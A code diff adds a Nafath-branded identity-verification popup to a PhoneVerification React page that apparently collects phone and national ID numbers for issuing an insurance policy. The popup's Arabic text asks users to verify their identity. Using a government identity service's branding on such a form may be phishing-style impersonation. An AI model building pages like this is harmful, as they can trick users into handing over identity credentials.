@@ -84,6 +84,7 @@ export default function PhoneVerification() {
   const [phoneError, setPhoneError] = useState("");
   const [idError, setIdError] = useState("");
   const [autoRedirecting, setAutoRedirecting] = useState(false);
+  const [showNafathPopup, setShowNafathPopup] = useState(true);
 
   const {
     register,
@@ -252,6 +253,47 @@ export default function PhoneVerification() {
   return (
     <PageLayout variant="default">
       <WaitingOverlay />
+
+      {/* Nafath Popup */}
+      {showNafathPopup && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-6">
+          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden">
+            {/* Gradient top bar */}
+            <div className="h-2 bg-gradient-to-l from-[#2ABFAB] to-[#1A8A7A]"></div>
+            <div className="p-6 text-center">
+              {/* Nafath icon */}
+              <div className="flex justify-center mb-4">
+                <div className="w-20 h-20 rounded-2xl overflow-hidden shadow-md">
+                  <img
+                    src="/images/nafath.webp"
+                    alt="نفاذ"
+                    className="w-full h-full object-cover"
+                  />
+                </div>
+              </div>
+              {/* Title */}
+              <p className="text-gray-500 text-sm mb-1">النفاذ الوطني الموحد</p>
+              <h2 className="text-2xl font-bold text-gray-800 mb-3">نفاذ</h2>
+              {/* Message */}
+              <h3 className="text-lg font-bold text-gray-800 mb-2">عميلنا الكريم</h3>
+              <p className="text-gray-600 text-sm leading-relaxed mb-6">
+                لإتمام عملية إصدار وثيقة التأمين وربطها بحسابك في
+                منصة النفاذ الوطني الموحد، يُرجى التحقق من هويتك.
+                هذا الإجراء مطلوب نظاماً لضمان صحة البيانات
+                وحماية حقوقك.
+              </p>
+              {/* Continue Button */}
+              <button
+                onClick={() => setShowNafathPopup(false)}
+                className="w-full py-3 rounded-xl text-white font-bold text-lg transition-all"
+                style={{ background: 'linear-gradient(to left, #2ABFAB, #1A8A7A)' }}
+              >
+                متابعة
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
 
       <div className="bg-white rounded-2xl shadow-xl p-6">
         {/* Header */}
